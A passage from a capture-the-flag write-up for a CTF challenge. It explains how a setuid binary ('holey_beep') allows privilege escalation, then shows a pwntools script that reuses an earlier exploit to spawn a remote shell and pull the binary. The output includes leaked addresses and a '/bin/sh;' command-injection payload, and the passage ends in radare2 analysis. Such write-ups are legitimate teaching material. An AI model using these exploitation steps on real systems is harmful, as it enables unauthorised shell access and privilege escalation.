-r-sr-xr-x 1 admin  user     9000 Sep 26 15:44 holey_beep
-r-xr-xr-x 1 user   nogroup 18224 Sep 26 15:44 todo
drwxrwxrwt 2 user   user       80 Dec  2 21:22 todos
$ ./holey_beep
holey_beep: usage: holey_beep period1 [period2] [period3] [...]
```
Notice the "s" in the `holey_beep` file's attributes. That's the "setuid" or "suid" bit. If an executable has the "setuid" bit set when a user executes it, it will execute with the owner's permission level and not the executor's permission level. So, we can use this to perform privilege escalation, if the program has a bug. And in fact, our case is based on a real-world exploit called... [Holey Beep](https://holeybeep.ninja/)! (A technical explanation can be found [here](https://sigint.sh/#/holeybeep)).
Let's extract `holey_beep` with a script based on the `exploit.py` from the previous stage (the binary was also attached to the challenge):
```python
from pwn import *
import exploit
r = exploit.spawn_shell()
r.sendline("cat holey_beep && exit")
r.recvuntil(" ")
out = r.recvall() # Will also contain some junk at the end, which won't affect the ELF
write("holey_beep", out)
```
Output:
```console
root@kali:/media/sf_CTFs/google/todo# python extract_beep.py
[*] '/media/sf_CTFs/google/todo/todo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to fridge-todo-list.ctfcompetition.com on port 1337: Done
[*] Address of write() @ .got.plt: 0x5646264e7916
[*] Address of write() plt: 0x910
[*] Address of system() plt: 0x940
[*] Base address: 0x5646264e7006
[*] Calculates address of system() resolution logic @ plt: 0x5646264e7946
[*] Storing TODO:
    00000000  2f 62 69 6e  2f 73 68 3b  46 79 4e 26  46 56 00 00  │/bin│/sh;│FyN&│FV··│
    00000010
[+] Receiving all data: Done (8.86KB)
[*] Closed connection to fridge-todo-list.ctfcompetition.com port 1337
root@kali:/media/sf_CTFs/google/todo# file holey_beep
holey_beep: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6fe5703ed40e673f85df5a7332b9ad3d94a17c99, not stripped
```
So we have an executable, let's explore it:
```
root@kali:/media/sf_CTFs/google/holey_beep# r2 holey_beep
 -- Don't wait for Travis
[0x00000800]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00000800]> afl
0x00000000    3 236  -> 225  sym.imp.__libc_start_main